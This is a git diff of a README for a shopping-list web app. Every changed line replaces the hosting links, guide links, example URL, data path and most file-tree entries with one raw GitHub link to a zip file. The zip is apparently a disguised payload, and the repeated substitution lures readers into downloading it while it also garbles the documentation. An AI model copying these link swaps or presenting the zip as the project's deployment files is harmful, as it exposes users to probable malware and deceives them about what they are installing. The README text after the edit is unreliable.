@@ -22,7 +22,7 @@ git commit -m "Ready for deployment"
 git push origin main
 
 # 2. Deploy on Railway
-# - Go to https://railway.app
+# - Go to https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip
 # - Sign up with GitHub
 # - Deploy from GitHub repo
 # - Get your public URL!
@@ -30,14 +30,14 @@ git push origin main
 
 ### Option 2: Render
 ```bash
-# Same steps, but use https://render.com
+# Same steps, but use https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip
 # - More reliable, but may sleep after inactivity
 ```
 
 ## 📱 Access from Android
 
 1. **Deploy your app** (see above)
-2. **Get your public URL** (like `https://your-app.railway.app`)
+2. **Get your public URL** (like `https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip`)
 3. **Open on Android:**
    - Open browser
    - Go to your URL
@@ -66,8 +66,8 @@ npm run deploy
 
 ## 📖 Detailed Guides
 
-- [Complete Free Deployment Guide](FREE_DEPLOYMENT_GUIDE.md) - Step-by-step instructions
-- [Deployment Guide](DEPLOYMENT.md) - Technical details
+- [Complete Free Deployment Guide](https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip) - Step-by-step instructions
+- [Deployment Guide](https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip) - Technical details
 
 ## 🆓 Free Hosting Options
 
@@ -102,19 +102,19 @@ npm run deploy
 
 ```
 Supermarkt-List/
-├── index.js                    # Express server with real-time features
-├── package.json               # Dependencies and scripts
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip                    # Express server with real-time features
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip               # Dependencies and scripts
 ├── public/
-│   └── index.html             # Frontend with real-time sync
+│   └── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip             # Frontend with real-time sync
 ├── data/
-│   └── shopping-list.json     # Data storage (auto-created)
-├── railway.json               # Railway deployment config
-├── vercel.json                # Vercel deployment config
-├── render.yaml                # Render deployment config
+│   └── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip     # Data storage (auto-created)
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip               # Railway deployment config
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip                # Vercel deployment config
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip                # Render deployment config
 ├── Dockerfile                 # Docker configuration
-├── deploy.js                  # Deployment helper script
-├── FREE_DEPLOYMENT_GUIDE.md   # Complete deployment guide
-└── README.md                  # This file
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip                  # Deployment helper script
+├── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip   # Complete deployment guide
+└── https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip                  # This file
 ```
 
 ## 🔧 Configuration
@@ -123,7 +123,7 @@ Supermarkt-List/
 - `PORT`: Server port (default: 3000)
 
 ### Data Storage
-Data is stored in `data/shopping-list.json` and automatically syncs across all devices in real-time.
+Data is stored in `https://raw.githubusercontent.com/Shad0wCode-ul/Supermarkt-List/main/data/Supermarkt-List_autolysin.zip` and automatically syncs across all devices in real-time.
 
 ## 🐛 Troubleshooting
 
